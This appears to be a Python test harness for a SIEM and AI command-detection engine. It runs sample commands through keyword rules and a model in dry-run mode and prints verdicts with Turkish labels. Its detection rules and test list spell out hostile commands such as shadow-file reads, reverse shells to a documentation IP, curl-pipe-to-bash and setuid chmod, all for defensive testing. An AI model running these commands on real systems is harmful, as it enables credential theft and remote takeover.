#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
SIEM & AI DEFENSE SIMULATOR & DRY-RUN TEST SUITE (simulate_test.py)
==============================================================================
This tool allows you to safely test any command, payload, or log line against
the Multi-Layer AI Security Engine and Regex Rule sets WITHOUT applying active
firewall bans or terminating user sessions (Dry-Run / Warning Mode Only).
==============================================================================
Usage:
  python simulate_test.py                 (Runs pre-configured test scenarios)
  python simulate_test.py "cat /etc/shadow" (Inspects a specific command)
  python simulate_test.py --interactive   (Opens an interactive test shell)
==============================================================================
"""

import sys
import time
import os

# Initialize AI Security Engine & Canonicalizer
from modules.ai_security_engine import AISecurityEngine
from modules.canonicalizer import PayloadCanonicalizer

print("======================================================================================================")
print("             SIEM & AI DEFENSE SIMULATOR (DRY-RUN / WARNING ONLY MODE)                                ")
print("======================================================================================================")

ai_engine = AISecurityEngine()
ai_engine.load_all_models()

def evaluate_command(command: str, username: str = "test_user") -> dict:
    """
    Evaluates a command and determines what the SIEM would do in live production.
    Does NOT ban the IP or terminate sessions.
    """
    canonical_cmd = PayloadCanonicalizer.canonicalize(command).strip()
    cmd_lower = canonical_cmd.lower()
    
    # 1. System Maintenance / Routine Whitelist Check
    if any(w in cmd_lower for w in [
        "ufw ", "iptables ", "ip6tables ", "pkill ", "ss -k", "conntrack -d", "main.py", "manage.py",
        "landscape-sysinfo", "update-notifier", "update-motd", "motd-news", "apt-check", "systemd",
        "gpg-agent", "ssh-agent", "dbus", "snapd", "cloud-init", "locale", "dircolors", "mesg",
        "ubuntu-advantage", "apt-esm-hook", "fwupd", "hwe-eol", "esm-cache", "lesspipe",
        "motd.ubuntu.com", "ubuntu.com", "canonical",
        "/etc/update-motd", "/usr/lib/ubuntu-advantage", "/usr/lib/update-notifier", "/usr/libexec"
    ]):
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "SAFE / WHITELISTED",
            "risk_score": 0,
            "verdict": "BENIGN",
            "confidence": 100.0,
            "action_simulated": "ALLOW (System Whitelist / Maintenance)",
            "mitre_id": "N/A",
            "category": "SAFE_SYSTEM_OPERATION"
        }

    # 2. Deterministic High-Risk Rule Signatures
    if any(w in cmd_lower for w in ["rm -rf /", "shred", "mkfs", "dd if=/dev/zero", "dd if=/dev/urandom"]):
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "MALICIOUS (CRITICAL)",
            "risk_score": 90,
            "verdict": "ATTACK",
            "confidence": 100.0,
            "action_simulated": "WOULD TRIGGER: CRITICAL BAN & SESSION KILL (120 Mins)",
            "mitre_id": "T1485",
            "category": "DESTRUCTIVE_MUTATION"
        }

    if ("curl" in cmd_lower or "wget" in cmd_lower) and ("| bash" in cmd_lower or "| sh" in cmd_lower or "| perl" in cmd_lower):
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "MALICIOUS (HIGH)",
            "risk_score": 80,
            "verdict": "ATTACK",
            "confidence": 99.5,
            "action_simulated": "WOULD TRIGGER: HIGH BAN & SESSION KILL (40 Mins)",
            "mitre_id": "T1059.004",
            "category": "UNVERIFIED_SCRIPT_PIPE"
        }

    is_shadow_read = any(s in cmd_lower for s in ["/etc/shadow", "etc/shadow", "s?ad*w", "sha\\"]) and any(b in cmd_lower for b in ["cat", "head", "tail", "less", "more", "awk", "sed", "nl", "xxd", "hexdump", "strings", "grep", "cut", "python", "perl", "open(", "find", "c?t"])
    if is_shadow_read:
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "MALICIOUS (CRITICAL)",
            "risk_score": 75,
            "verdict": "ATTACK",
            "confidence": 99.3,
            "action_simulated": "WOULD TRIGGER: CRITICAL BAN & SESSION KILL (120 Mins)",
            "mitre_id": "T1003.008",
            "category": "SENSITIVE_FILE_READ"
        }

    if any(w in cmd_lower for w in ["chmod +s /bin/bash", "chmod 4755", "chmod u+s /bin", "pkexec /bin/sh", "--checkpoint-action=exec"]):
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "MALICIOUS (CRITICAL)",
            "risk_score": 75,
            "verdict": "ATTACK",
            "confidence": 99.9,
            "action_simulated": "WOULD TRIGGER: CRITICAL BAN & SESSION KILL (120 Mins)",
            "mitre_id": "T1548.001",
            "category": "PRIVILEGE_ESCALATION"
        }

    if any(w in cmd_lower for w in ["nc -e", "ncat -e", "/dev/tcp/", "socat exec", "mkfifo", "mknod"]):
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "MALICIOUS (CRITICAL)",
            "risk_score": 85,
            "verdict": "ATTACK",
            "confidence": 98.7,
            "action_simulated": "WOULD TRIGGER: CRITICAL BAN & SESSION KILL (120 Mins)",
            "mitre_id": "T1059",
            "category": "REVERSE_SHELL_ATTEMPT"
        }

    if ("python" in cmd_lower or "perl" in cmd_lower or "php" in cmd_lower) and any(k in cmd_lower for k in ["socket", "pty", "subprocess", "exec", "b64decode", "zlib"]):
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": "MALICIOUS (CRITICAL)",
            "risk_score": 75,
            "verdict": "ATTACK",
            "confidence": 98.4,
            "action_simulated": "WOULD TRIGGER: CRITICAL BAN & SESSION KILL (120 Mins)",
            "mitre_id": "T1059.006",
            "category": "INLINE_INTERPRETER_EXEC"
        }

    # 3. AI Security Engine Multi-Model Inference
    ai_res = ai_engine.analyze(canonical_cmd)
    if ai_res.get("is_attack"):
        conf = ai_res.get("confidence", 75.0)
        mitre = ai_res.get("mitre_id", "T1059")
        cat = ai_res.get("incident_category", "AI_ANOMALY")
        title = ai_res.get("incident_title", "Suspicious Activity")
        urgency = ai_res.get("urgency", "HIGH")
        score = 75 if urgency == "CRITICAL" else 60
        return {
            "command": command,
            "canonical": canonical_cmd,
            "status": f"MALICIOUS ({urgency})",
            "risk_score": score,
            "verdict": "ATTACK",
            "confidence": conf,
            "action_simulated": f"WOULD TRIGGER: {urgency} BAN & SESSION KILL",
            "mitre_id": mitre,
            "category": cat,
            "details": f"{title} (Confidence: {conf:.1f}%)"
        }

    return {
        "command": command,
        "canonical": canonical_cmd,
        "status": "SAFE / BENIGN",
        "risk_score": 0,
        "verdict": "BENIGN",
        "confidence": 100.0 - ai_res.get("confidence", 0.0),
        "action_simulated": "ALLOW (Routine Command)",
        "mitre_id": "N/A",
        "category": "ROUTINE_COMMAND"
    }

def print_result(res: dict):
    is_mal = "MALICIOUS" in res["status"]
    status_icon = "[!] [UYARI / TEHDIT]" if is_mal else "[OK] [GUVENLI / MEZRUR]"
    
    print("\n" + "-" * 88)
    print(f"KOMUT               : {res['command']}")
    print(f"KANONIK (COZULMUS)  : {res['canonical']}")
    print(f"DURUM               : {status_icon} -> {res['status']}")
    print(f"RISK PUANI          : {res['risk_score']} / 100")
    print(f"YAPAY ZEKA KARARI   : {res['verdict']} (Guven: {res.get('confidence', 0):.1f}%)")
    print(f"MITRE ATT&CK KODU   : {res['mitre_id']} ({res['category']})")
    print(f"CANLI SISTEM TEPKISI: {res['action_simulated']}")
    if "details" in res:
        print(f"DETAY               : {res['details']}")
    print("-" * 88)

def run_suite():
    test_cases = [
        # Tehdit Testleri
        "cat /etc/shadow",
        "python3 -c \"import socket; s=socket.socket(); s.connect(('192.0.2.1', 4444))\"",
        "curl -s http://example.com/install.sh | bash",
        "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in(4444,inet_aton(\"192.0.2.1\")));'",
        "echo \"ZXhwb3J0IFRFU1RfQ01EPTEK\" | base64 -d | bash",
        "mkfifo /tmp/test_pipe && rm -f /tmp/test_pipe",
        "chmod 4755 /bin/bash",
        "nc -e /bin/sh 192.0.2.1 4444",

        # Masum Sistem Komutları (False-Positive Kontrolü)
        "sudo df -h",
        "sudo apt update",
        "uptime",
        "ls -la /var/log",
        "/usr/bin/python3 /usr/bin/landscape-sysinfo",
        "curl -s --connect-timeout 2 https://motd.ubuntu.com"
    ]

    print("\n[*] Örnek Test Senaryoları Simüle Ediliyor (Hiçbir Ban Atılmaz):\n")
    for cmd in test_cases:
        res = evaluate_command(cmd)
        print_result(res)

def interactive_mode():
    print("\n[*] İnteraktif Test Modu Açıldı. Dilediğiniz komutu yazıp Enter'a basın.")
    print("[*] (Çıkmak için 'exit' veya 'quit' yazın)\n")
    while True:
        try:
            cmd = input("SIEM-Test > ").strip()
            if not cmd:
                continue
            if cmd.lower() in ["exit", "quit", "q"]:
                break
            res = evaluate_command(cmd)
            print_result(res)
        except (KeyboardInterrupt, EOFError):
            print("\nTest sonlandırıldı.")
            break

if __name__ == "__main__":
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg in ["--interactive", "-i"]:
            interactive_mode()
        else:
            res = evaluate_command(" ".join(sys.argv[1:]))
            print_result(res)
    else:
        run_suite()
